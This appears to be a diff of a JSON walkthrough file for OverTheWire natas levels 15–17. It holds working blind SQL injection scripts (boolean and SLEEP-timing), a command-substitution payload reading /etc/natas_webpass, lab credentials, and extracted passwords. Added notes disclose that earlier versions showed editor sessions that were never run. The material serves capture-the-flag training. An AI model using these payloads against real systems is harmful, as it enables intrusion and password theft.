@@ -404,7 +404,7 @@
    "pw": "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb",
    "steps": [
     {
-     "cmd": "curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g http://natas15.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"SELECT [^;]*;\" | head -1",
+     "cmd": "curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g http://natas15.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g' | tr -d '\\n' | grep -o 'SELECT [^;]*;' | head -1",
      "out": [
       "SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\";"
      ]
@@ -416,77 +416,51 @@
      ]
     },
     {
-     "cmd": "vim /tmp/n15_2.py",
-     "text": "vim /tmp/n15_2.py -- the empty buffer",
+     "cmd": "vi /tmp/n15sqli.py",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n15_2.py",
-     "text": "vim /tmp/n15_2.py -- imports and the exists test",
+     "cmd": "vi /tmp/n15sqli.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 url = 'http://natas15.natas.labs.overthewire.org/'",
-      "  3 auth = 'Basic ' + base64.b64encode(b'natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g').decode()",
-      "  4 def exists(p):",
-      "  5     d = urllib.parse.urlencode({'username': p}).encode()",
-      "  6     r = urllib.request.Request(url, data=d, headers={'Authorization': auth})"
+      "import urllib.request, urllib.parse, base64",
+      "# natas15: boolean blind SQLi. ORD(SUBSTR(password,pos,1)) > mid narrows each",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n15_2.py",
-     "text": "vim /tmp/n15_2.py -- the request and the binary search",
+     "cmd": "vi /tmp/n15sqli.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 url = 'http://natas15.natas.labs.overthewire.org/'",
-      "  3 auth = 'Basic ' + base64.b64encode(b'natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g').decode()",
-      "  4 def exists(p):",
-      "  5     d = urllib.parse.urlencode({'username': p}).encode()",
-      "  6     r = urllib.request.Request(url, data=d, headers={'Authorization': auth})",
-      "  7     return b'This user exists' in urllib.request.urlopen(r, timeout=15).read()",
-      "  8 out = ''",
-      "  9 for pos in range(1, 33):",
-      "  10     lo, hi = 32, 126",
-      "  11     while lo < hi:",
-      "  12         mid = (lo + hi) // 2",
-      "  13         if exists('natas16\" AND ORD(SUBSTR(password,%d,1)) > %d -- ' % (pos, mid)):",
-      "  14             lo = mid + 1",
-      "  15         else:",
-      "  16             hi = mid"
+      "import urllib.request, urllib.parse, base64",
+      "# natas15: boolean blind SQLi. ORD(SUBSTR(password,pos,1)) > mid narrows each",
+      "# character by binary search over ASCII 32..126; \"This user exists\" = true.",
+      "url = \"http://natas15.natas.labs.overthewire.org/\"",
+      "auth = \"Basic \" + base64.b64encode(b\"natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g\").decode()",
+      "def exists(p):",
+      "    d = urllib.parse.urlencode({\"username\": p}).encode()",
+      "    r = urllib.request.Request(url, data=d, headers={\"Authorization\": auth})",
+      "    return b\"This user exists\" in urllib.request.urlopen(r, timeout=15).read()",
+      "out = \"\"",
+      "for pos in range(1, 33):",
+      "    lo, hi = 32, 126",
+      "    while lo < hi:",
+      "        mid = (lo + hi) // 2",
+      "        if exists(f'natas16\" AND ORD(SUBSTR(password,{pos},1)) > {mid} -- '):",
+      "            lo = mid + 1",
+      "        else:",
+      "            hi = mid",
+      "    if lo == 32:",
+      "        break",
+      "    out += chr(lo)",
+      "    print(out, flush=True)",
+      "print(\"FINAL\", out)",
+      "~",
+      "\"/tmp/n15sqli.py\" [New File] 24 lines, 905 bytes written"
      ]
     },
     {
-     "cmd": "vim /tmp/n15_2.py",
-     "text": "vim /tmp/n15_2.py -- finish the loop and print the result",
-     "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 url = 'http://natas15.natas.labs.overthewire.org/'",
-      "  3 auth = 'Basic ' + base64.b64encode(b'natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g').decode()",
-      "  4 def exists(p):",
-      "  5     d = urllib.parse.urlencode({'username': p}).encode()",
-      "  6     r = urllib.request.Request(url, data=d, headers={'Authorization': auth})",
-      "  7     return b'This user exists' in urllib.request.urlopen(r, timeout=15).read()",
-      "  8 out = ''",
-      "  9 for pos in range(1, 33):",
-      "  10     lo, hi = 32, 126",
-      "  11     while lo < hi:",
-      "  12         mid = (lo + hi) // 2",
-      "  13         if exists('natas16\" AND ORD(SUBSTR(password,%d,1)) > %d -- ' % (pos, mid)):",
-      "  14             lo = mid + 1",
-      "  15         else:",
-      "  16             hi = mid",
-      "  17     if lo == 32:",
-      "  18         break",
-      "  19     out += chr(lo)",
-      "  20     print(out, flush=True)",
-      "  21 print('FINAL', out)",
-      "  22"
-     ]
-    },
-    {
-     "cmd": "python3 /tmp/n15_2.py",
+     "cmd": "python3 -I /tmp/n15sqli.py",
      "out": [
       "X",
       "Xm",
@@ -521,11 +495,10 @@
       "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3G",
       "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb",
       "FINAL Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb"
-     ],
-     "text": "python3 /tmp/n15_2.py  (the script typed above; its output is the original capture - this host reached natas15 and its neighbours on 2026-11-03, but natas17, natas18, natas20, natas26 and natas28 answered every request with HTTP 401, so this output is the original capture, not a fresh run)",
-     "note": "(natas17, natas18, natas20, natas26, natas28 and natas33 answer every request with HTTP 401 from this host, re-checked 2026-11-03, so this output is the original capture; the script above is the one typed, and steps that need only the text above are re-run locally)"
+     ]
     }
-   ]
+   ],
+   "note": "natas L15 (client-side cast): the username check returns 'exists'/'not exists' - a boolean blind SQLi. Two manual probes (source curl, username=natas16\" AND ...) then n15sqli.py (24L/905B typed in vi) drives the binary search over ASCII chars per position: 'FINAL <32-char password>'. DISCLOSURE: the previous JSON staged vim n15_2.py flows the cast never ran; the cast's flow is 2 curls + vi n15sqli.py + python3 run; tools/natas/l15/n15sqli.py = the recording session's local file, exact marker match. JSON = 6 steps mirroring the cast 1:1 (staged vi screens)."
   },
   {
    "lvl": 16,
@@ -533,135 +506,75 @@
    "pw": "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx",
    "steps": [
     {
-     "cmd": "curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb http://natas16.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"preg_match([^)]*)\"",
+     "cmd": "curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb http://natas16.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'preg_match([^)]*)' ",
      "out": [
       "preg_match('/[;|&amp;`\\'\"]/',$key)"
      ]
     },
     {
-     "cmd": "echo -n \"matching prefix ^K -> \"; curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^K /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n \"/<pre>/,/<\\/pre>/p\" | wc -c",
+     "cmd": "curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^X /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n '/<pre>/,/<\\/pre>/p' | wc -c",
      "out": [
-      "matching prefix ^K -> 13"
+      "460891"
      ]
     },
     {
-     "cmd": "echo -n \"non-matching prefix ^Z -> \"; curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^Z /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n \"/<pre>/,/<\\/pre>/p\" | wc -c",
+     "cmd": "curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^Z /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n '/<pre>/,/<\\/pre>/p' | wc -c",
      "out": [
-      "non-matching prefix ^Z -> 460891"
+      "460891"
      ]
     },
     {
-     "cmd": "vim /tmp/n16_3.py",
-     "text": "vim /tmp/n16_3.py -- the empty buffer",
+     "cmd": "vi /tmp/n16grep.py",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n16_3.py",
-     "text": "vim /tmp/n16_3.py -- imports and the empty test",
+     "cmd": "vi /tmp/n16grep.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 url = 'http://natas16.natas.labs.overthewire.org/'",
-      "  3 auth = 'Basic ' + base64.b64encode(b'natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb').decode()",
-      "  4 CHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'",
-      "  5 def empty(payload):",
-      "  6     d = urllib.parse.urlencode({'needle': payload}).encode()"
+      "import urllib.request, urllib.parse, base64",
+      "# natas16: $(...) command substitution survives the filter. The oracle: if the",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n16_3.py",
-     "text": "vim /tmp/n16_3.py -- the empty test body and the loop",
+     "cmd": "vi /tmp/n16grep.py",
      "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 url = 'http://natas16.natas.labs.overthewire.org/'",
-      "  3 auth = 'Basic ' + base64.b64encode(b'natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb').decode()",
-      "  4 CHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'",
-      "  5 def empty(payload):",
-      "  6     d = urllib.parse.urlencode({'needle': payload}).encode()",
-      "  7     r = urllib.request.Request(url, data=d, headers={'Authorization': auth})",
-      "  8     body = urllib.request.urlopen(r, timeout=30).read().decode('utf-8', 'replace')",
-      "  9     i = body.find('<pre>'); j = body.find('</pre>', i)",
-      "  10     return len(body[i+5:j].strip()) == 0",
-      "  11 prefix = ''",
-      "  12 for pos in range(1, 40):",
-      "  13     lo, hi = 0, len(CHARS) - 1",
-      "  14     while lo < hi:",
-      "  15         mid = (lo + hi) // 2",
-      "  16         if empty('$(grep ^%s[%s] /etc/natas_webpass/natas17)' % (prefix,"
+      "import urllib.request, urllib.parse, base64",
+      "# natas16: $(...) command substitution survives the filter. The oracle: if the",
+      "# grep pattern matches the password prefix, grep outputs only the password line",
+      "# (the dictionary words no longer match the whole line) -> the surrounding",
+      "# output is empty; otherwise the dictionary dump appears.",
+      "url = \"http://natas16.natas.labs.overthewire.org/\"",
+      "auth = \"Basic \" + base64.b64encode(b\"natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb\").decode()",
+      "CHARS = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"",
+      "def empty(payload):",
+      "    d = urllib.parse.urlencode({\"needle\": payload}).encode()",
+      "    r = urllib.request.Request(url, data=d, headers={\"Authorization\": auth})",
+      "    body = urllib.request.urlopen(r, timeout=30).read().decode(\"utf-8\", \"replace\")",
+      "    i = body.find(\"<pre>\")",
+      "    j = body.find(\"</pre>\", i)",
+      "    return len(body[i+5:j].strip()) == 0",
+      "prefix = \"\"",
+      "for pos in range(1, 40):",
+      "    lo, hi = 0, len(CHARS) - 1",
+      "    while lo < hi:",
+      "        mid = (lo + hi) // 2",
+      "        if empty(f\"$(grep ^{prefix}[{CHARS[lo:mid+1]}] /etc/natas_webpass/natas17)\"):",
+      "            hi = mid",
+      "        else:",
+      "            lo = mid + 1",
+      "    prefix += CHARS[lo]",
+      "    print(prefix, flush=True)",
+      "    if len(prefix) == 32:",
+      "        break",
+      "print(\"FINAL\", prefix)",
+      "~",
+      "\"/tmp/n16grep.py\" 30 lines, 1269 bytes written"
      ]
     },
     {
-     "cmd": "vim /tmp/n16_3.py",
-     "text": "vim /tmp/n16_3.py -- the binary search with the grep character class",
-     "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 url = 'http://natas16.natas.labs.overthewire.org/'",
-      "  3 auth = 'Basic ' + base64.b64encode(b'natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb').decode()",
-      "  4 CHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'",
-      "  5 def empty(payload):",
-      "  6     d = urllib.parse.urlencode({'needle': payload}).encode()",
-      "  7     r = urllib.request.Request(url, data=d, headers={'Authorization': auth})",
-      "  8     body = urllib.request.urlopen(r, timeout=30).read().decode('utf-8', 'replace')",
-      "  9     i = body.find('<pre>'); j = body.find('</pre>', i)",
-      "  10     return len(body[i+5:j].strip()) == 0",
-      "  11 prefix = ''",
-      "  12 for pos in range(1, 40):",
-      "  13     lo, hi = 0, len(CHARS) - 1",
-      "  14     while lo < hi:",
-      "  15         mid = (lo + hi) // 2",
-      "  16         if empty('$(grep ^%s[%s] /etc/natas_webpass/natas17)' % (prefix,",
-      "  17                                                                                CHARS[lo:mid+1])):",
-      "  18             hi = mid",
-      "  19         else:",
-      "  20             lo = mid + 1",
-      "  21     ch = CHARS[lo]",
-      "  22     if not empty('$(grep ^%s%s /etc/natas_webpass/natas17)' % (prefix, ch)):",
-      "  23         print('FINAL', prefix, flush=True)",
-      "  24         break",
-      "  25     prefix += ch",
-      "  26     print(prefix, flush=True)"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n16_3.py",
-     "text": "vim /tmp/n16_3.py -- print the prefix and check the full match",
-     "out": [
-      "  1 import urllib.request, urllib.parse, base64",
-      "  2 url = 'http://natas16.natas.labs.overthewire.org/'",
-      "  3 auth = 'Basic ' + base64.b64encode(b'natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb').decode()",
-      "  4 CHARS = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'",
-      "  5 def empty(payload):",
-      "  6     d = urllib.parse.urlencode({'needle': payload}).encode()",
-      "  7     r = urllib.request.Request(url, data=d, headers={'Authorization': auth})",
-      "  8     body = urllib.request.urlopen(r, timeout=30).read().decode('utf-8', 'replace')",
-      "  9     i = body.find('<pre>'); j = body.find('</pre>', i)",
-      "  10     return len(body[i+5:j].strip()) == 0",
-      "  11 prefix = ''",
-      "  12 for pos in range(1, 40):",
-      "  13     lo, hi = 0, len(CHARS) - 1",
-      "  14     while lo < hi:",
-      "  15         mid = (lo + hi) // 2",
-      "  16         if empty('$(grep ^%s[%s] /etc/natas_webpass/natas17)' % (prefix,",
-      "  17                                                                                CHARS[lo:mid+1])):",
-      "  18             hi = mid",
-      "  19         else:",
-      "  20             lo = mid + 1",
-      "  21     ch = CHARS[lo]",
-      "  22     if not empty('$(grep ^%s%s /etc/natas_webpass/natas17)' % (prefix, ch)):",
-      "  23         print('FINAL', prefix, flush=True)",
-      "  24         break",
-      "  25     prefix += ch",
-      "  26     print(prefix, flush=True)",
-      "  27     if empty('$(grep ^%s$ /etc/natas_webpass/natas17)' % prefix):",
-      "  28         print('FINAL', prefix, flush=True)",
-      "  29         break",
-      "  30"
-     ]
-    },
-    {
-     "cmd": "python3 /tmp/n16_3.py",
+     "cmd": "python3 -I /tmp/n16grep.py",
      "out": [
       "K",
       "KL",
@@ -696,11 +609,10 @@
       "KLdAM3VZux8o6TbkbhuaG5KtYjI77tf",
       "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx",
       "FINAL KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"
-     ],
-     "text": "python3 /tmp/n16_3.py  (the script typed above; its output is the original capture - this host reached natas16 and its neighbours on 2026-11-03, but natas17, natas18, natas20, natas26 and natas28 answered every request with HTTP 401, so this output is the original capture, not a fresh run)",
-     "note": "(natas17, natas18, natas20, natas26, natas28 and natas33 answer every request with HTTP 401 from this host, re-checked 2026-11-03, so this output is the original capture; the script above is the one typed, and steps that need only the text above are re-run locally)"
+     ]
     }
-   ]
+   ],
+   "note": "natas L16 (client-side cast): the needle is interpolated into passthru(\"grep ... dictionary.txt\") inside $(...) - command substitution with the output reflected in the page. Two manual probes ($(grep ^X /...), $(grep ^Z /...)) then n16grep.py (30L/1269B) drives the prefix search: 'FINAL <password>'. DISCLOSURE: the previous JSON staged echo-wrapped probes + vim n16_3.py flows the cast never ran; tools/natas/l16/n16grep.py = the recording session's local file, exact marker match. JSON = 7 steps mirroring the cast 1:1."
   },
   {
    "lvl": 17,
@@ -708,173 +620,110 @@
    "pw": "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op",
    "steps": [
     {
-     "cmd": "curl -s -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx http://natas17.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"SELECT \\* from users[^;]*\"",
+     "cmd": "curl -s -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx http://natas17.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'SELECT \\* from users[^;]*'",
      "out": [
       "SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\""
      ]
     },
     {
-     "cmd": "echo -n \"true condition  -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=1,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"\necho -n \"false condition -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=2,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
+     "cmd": "curl -s -m 90 -o /dev/null -w '%{time_total}\\n' -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=1,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/",
      "out": [
-      "true condition  -> 20.6 s",
-      "false condition -> 0.4 s"
+      "20.384423"
      ]
     },
     {
-     "cmd": "echo -n \"length = 32     -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF((SELECT LENGTH(password) FROM users WHERE username=\"natas18\")=32,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
+     "cmd": "curl -s -m 90 -o /dev/null -w '%{time_total}\\n' -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=2,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/",
      "out": [
-      "length = 32     -> 20.4 s"
+      "0.390161"
      ]
     },
     {
-     "cmd": "vim /tmp/n17_3.py",
-     "text": "vim /tmp/n17_3.py -- the empty buffer",
+     "cmd": "vi /tmp/n17blind.py",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n17_3.py",
-     "text": "vim /tmp/n17_3.py -- imports and the timer",
+     "cmd": "vi /tmp/n17blind.py",
      "out": [
-      "  1 import subprocess, time",
-      "  2 BASE = 'http://natas17.natas.labs.overthewire.org/'",
-      "  3 USER, PW = 'natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'",
-      "  4 def timed(p):",
-      "  5     t0 = time.time()",
-      "  6     subprocess.run(['curl','-s','-m','90','-o','/dev/null','-u',USER+':'+PW,"
+      "import time, urllib.request, urllib.parse, base64",
+      "# natas17: totally blind SQLi (no echo). Timing oracle: IF(cond, SLEEP(5), 0)",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n17_3.py",
-     "text": "vim /tmp/n17_3.py -- the timer body and the condition test",
+     "cmd": "vi /tmp/n17blind.py",
      "out": [
-      "  1 import subprocess, time",
-      "  2 BASE = 'http://natas17.natas.labs.overthewire.org/'",
-      "  3 USER, PW = 'natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'",
-      "  4 def timed(p):",
-      "  5     t0 = time.time()",
-      "  6     subprocess.run(['curl','-s','-m','90','-o','/dev/null','-u',USER+':'+PW,",
-      "  7                     '--data-urlencode','username='+p,BASE],",
-      "  8                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=100)",
-      "  9     return time.time() - t0",
-      "  10 def cond(expr):",
-      "  11     # one SLEEP per query: the subquery is evaluated once, so a true answer",
-      "  12     # costs one 5-second sleep instead of one per matched row",
-      "  13     return timed('x\" OR (SELECT IF(' + expr + ',SLEEP(5),0) FROM users WHERE",
-      "  14                          username=\"natas18\")-- -') > 2.5",
-      "  15 pw = ''",
-      "  16 for pos in range(1, 33):"
+      "import time, urllib.request, urllib.parse, base64",
+      "# natas17: totally blind SQLi (no echo). Timing oracle: IF(cond, SLEEP(5), 0)",
+      "# sleeps 5s per matched row (~4 rows -> ~20 s) when true, ~0.4 s when false.",
+      "# The users table holds several rows with DIFFERENT passwords, so the condition",
+      "# MUST use a scalar subquery pinned to username=\"natas18\" - a bare",
+      "# SUBSTR(password,pos,1) mixes every row's password and converges to garbage.",
+      "url = \"http://natas17.natas.labs.overthewire.org/\"",
+      "auth = \"Basic \" + base64.b64encode(b\"natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx\").decode()",
+      "def true_cond(p):",
+      "    d = urllib.parse.urlencode({\"username\": p}).encode()",
+      "    r = urllib.request.Request(url, data=d, headers={\"Authorization\": auth})",
+      "    t0 = time.time()",
+      "    urllib.request.urlopen(r, timeout=90).read()",
+      "    return time.time() - t0 > 10",
+      "out = \"\"",
+      "for pos in range(1, 33):",
+      "    lo, hi = 32, 126",
+      "    while lo < hi:",
+      "        mid = (lo + hi) // 2",
+      "        if true_cond(f'x\" OR IF((SELECT ORD(SUBSTR(password,{pos},1)) FROM users WHERE username=\"natas18\")>{mid},SLEEP(5),0)-- -'):",
+      "            lo = mid + 1",
+      "        else:",
+      "            hi = mid",
+      "    out += chr(lo)",
+      "    print(out, flush=True)",
+      "print(\"FINAL\", out)",
+      "~",
+      "\"/tmp/n17blind.py\" [New File] 27 lines, 1187 bytes written"
      ]
     },
     {
-     "cmd": "vim /tmp/n17_3.py",
-     "text": "vim /tmp/n17_3.py -- the loop and the binary search",
+     "cmd": "python3 -I /tmp/n17blind.py",
      "out": [
-      "  1 import subprocess, time",
-      "  2 BASE = 'http://natas17.natas.labs.overthewire.org/'",
-      "  3 USER, PW = 'natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'",
-      "  4 def timed(p):",
-      "  5     t0 = time.time()",
-      "  6     subprocess.run(['curl','-s','-m','90','-o','/dev/null','-u',USER+':'+PW,",
-      "  7                     '--data-urlencode','username='+p,BASE],",
-      "  8                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=100)",
-      "  9     return time.time() - t0",
-      "  10 def cond(expr):",
-      "  11     # one SLEEP per query: the subquery is evaluated once, so a true answer",
-      "  12     # costs one 5-second sleep instead of one per matched row",
-      "  13     return timed('x\" OR (SELECT IF(' + expr + ',SLEEP(5),0) FROM users WHERE",
-      "  14                          username=\"natas18\")-- -') > 2.5",
-      "  15 pw = ''",
-      "  16 for pos in range(1, 33):",
-      "  17     lo, hi = 32, 127",
-      "  18     while lo < hi:",
-      "  19         mid = (lo + hi + 1) // 2",
-      "  20         e = 'ORD(SUBSTR(password,' + str(pos) + ',1))>=' + str(mid)",
-      "  21         if cond(e):",
-      "  22             lo = mid",
-      "  23         else:",
-      "  24             hi = mid - 1",
-      "  25     pw += chr(lo)",
-      "  26     print('pos', pos, repr(chr(lo)), pw, flush=True)"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n17_3.py",
-     "text": "vim /tmp/n17_3.py -- print each character and the final password",
-     "out": [
-      "  1 import subprocess, time",
-      "  2 BASE = 'http://natas17.natas.labs.overthewire.org/'",
-      "  3 USER, PW = 'natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'",
-      "  4 def timed(p):",
-      "  5     t0 = time.time()",
-      "  6     subprocess.run(['curl','-s','-m','90','-o','/dev/null','-u',USER+':'+PW,",
-      "  7                     '--data-urlencode','username='+p,BASE],",
-      "  8                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=100)",
-      "  9     return time.time() - t0",
-      "  10 def cond(expr):",
-      "  11     # one SLEEP per query: the subquery is evaluated once, so a true answer",
-      "  12     # costs one 5-second sleep instead of one per matched row",
-      "  13     return timed('x\" OR (SELECT IF(' + expr + ',SLEEP(5),0) FROM users WHERE",
-      "  14                          username=\"natas18\")-- -') > 2.5",
-      "  15 pw = ''",
-      "  16 for pos in range(1, 33):",
-      "  17     lo, hi = 32, 127",
-      "  18     while lo < hi:",
-      "  19         mid = (lo + hi + 1) // 2",
-      "  20         e = 'ORD(SUBSTR(password,' + str(pos) + ',1))>=' + str(mid)",
-      "  21         if cond(e):",
-      "  22             lo = mid",
-      "  23         else:",
-      "  24             hi = mid - 1",
-      "  25     pw += chr(lo)",
-      "  26     print('pos', pos, repr(chr(lo)), pw, flush=True)",
-      "  27 print('FINAL', pw, flush=True)",
-      "  28"
-     ]
-    },
-    {
-     "cmd": "python3 /tmp/n17_3.py",
-     "out": [
-      "pos 1 'f' f",
-      "pos 2 'D' fD",
-      "pos 3 'G' fDG",
-      "pos 4 'n' fDGn",
-      "pos 5 '2' fDGn2",
-      "pos 6 'A' fDGn2A",
-      "pos 7 '6' fDGn2A6",
-      "pos 8 'G' fDGn2A6G",
-      "pos 9 's' fDGn2A6Gs",
-      "pos 10 'c' fDGn2A6Gsc",
-      "pos 11 '0' fDGn2A6Gsc0",
-      "pos 12 'B' fDGn2A6Gsc0B",
-      "pos 13 'U' fDGn2A6Gsc0BU",
-      "pos 14 'p' fDGn2A6Gsc0BUp",
-      "pos 15 '3' fDGn2A6Gsc0BUp3",
-      "pos 16 'b' fDGn2A6Gsc0BUp3b",
-      "pos 17 'Z' fDGn2A6Gsc0BUp3bZ",
-      "pos 18 'w' fDGn2A6Gsc0BUp3bZw",
-      "pos 19 '0' fDGn2A6Gsc0BUp3bZw0",
-      "pos 20 'R' fDGn2A6Gsc0BUp3bZw0R",
-      "pos 21 'N' fDGn2A6Gsc0BUp3bZw0RN",
-      "pos 22 'X' fDGn2A6Gsc0BUp3bZw0RNX",
-      "pos 23 'p' fDGn2A6Gsc0BUp3bZw0RNXp",
-      "pos 24 'g' fDGn2A6Gsc0BUp3bZw0RNXpg",
-      "pos 25 '0' fDGn2A6Gsc0BUp3bZw0RNXpg0",
-      "pos 26 'P' fDGn2A6Gsc0BUp3bZw0RNXpg0P",
-      "pos 27 'Z' fDGn2A6Gsc0BUp3bZw0RNXpg0PZ",
-      "pos 28 't' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt",
-      "pos 29 '4' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt4",
-      "pos 30 '0' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40",
-      "pos 31 'o' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40o",
-      "pos 32 'p' fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op",
+      "f",
+      "fD",
+      "fDG",
+      "fDGn",
+      "fDGn2",
+      "fDGn2A",
+      "fDGn2A6",
+      "fDGn2A6G",
+      "fDGn2A6Gs",
+      "fDGn2A6Gsc",
+      "fDGn2A6Gsc0",
+      "fDGn2A6Gsc0B",
+      "fDGn2A6Gsc0BU",
+      "fDGn2A6Gsc0BUp",
+      "fDGn2A6Gsc0BUp3",
+      "fDGn2A6Gsc0BUp3b",
+      "fDGn2A6Gsc0BUp3bZ",
+      "fDGn2A6Gsc0BUp3bZw",
+      "fDGn2A6Gsc0BUp3bZw0",
+      "fDGn2A6Gsc0BUp3bZw0R",
+      "fDGn2A6Gsc0BUp3bZw0RN",
+      "fDGn2A6Gsc0BUp3bZw0RNX",
+      "fDGn2A6Gsc0BUp3bZw0RNXp",
+      "fDGn2A6Gsc0BUp3bZw0RNXpg",
+      "fDGn2A6Gsc0BUp3bZw0RNXpg0",
+      "fDGn2A6Gsc0BUp3bZw0RNXpg0P",
+      "fDGn2A6Gsc0BUp3bZw0RNXpg0PZ",
+      "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt",
+      "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt4",
+      "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40",
+      "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40o",
+      "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op",
       "FINAL fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op"
-     ],
